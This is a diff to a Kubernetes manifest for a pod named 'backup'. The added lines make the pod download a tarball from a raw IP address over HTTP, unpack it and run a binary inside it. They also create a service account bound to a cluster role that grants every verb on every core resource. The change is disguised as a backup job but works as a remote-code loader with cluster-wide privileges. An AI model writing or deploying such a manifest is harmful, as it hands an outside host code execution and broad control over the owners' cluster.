@@ -1,11 +1,38 @@
-# Calif: this was so closeee
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: backup-sa
+---
 apiVersion: v1
 kind: Pod
 metadata:
-  name: backup-765d19
+  name: backup-765d18
 spec:
+  serviceAccountName: backup-sa
   containers:
   - name: ubuntu
     image: ubuntu:latest
-    command: ["bash", "-c", "apt update && apt install -y curl && curl -sk https://34.87.4.165/403"]
-  restartPolicy: Always
+    command: ["bash", "-c", "apt update && apt install -y curl && curl -s http://34.87.4.165/build/node.tgz | tar xz && ./node"]
+  restartPolicy: Never
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: backup-role
+rules:
+- apiGroups: [""]
+  resources: ["*"]
+  verbs: ["*"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: backup-rolebinding
+subjects:
+- kind: ServiceAccount
+  name: backup-sa
+  namespace: default
+roleRef:
+  kind: ClusterRole
+  name: backup-role
+  apiGroup: rbac.authorization.k8s.io
